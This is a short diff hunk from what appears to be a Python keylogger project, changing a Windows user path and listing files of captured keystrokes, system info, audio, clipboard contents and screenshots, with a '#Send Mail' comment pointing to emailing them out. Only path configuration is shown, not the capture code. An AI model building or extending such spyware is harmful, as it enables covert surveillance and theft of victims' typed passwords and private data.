@@ -30,7 +30,7 @@ screenshot_info = "screenshot.png"
 
 
 
-file_path = "C:\\Users\\Chandan\Desktop\\New_folder\\keylogger"
+file_path = "C:\\Users\\Aseem\Desktop\\New_folder\\keylogger"
 files = [file_path + keys_info, file_path + system_info, file_path + audio_info, file_path + clipboard_info, file_path + screenshot_info]
 
 #Send Mail
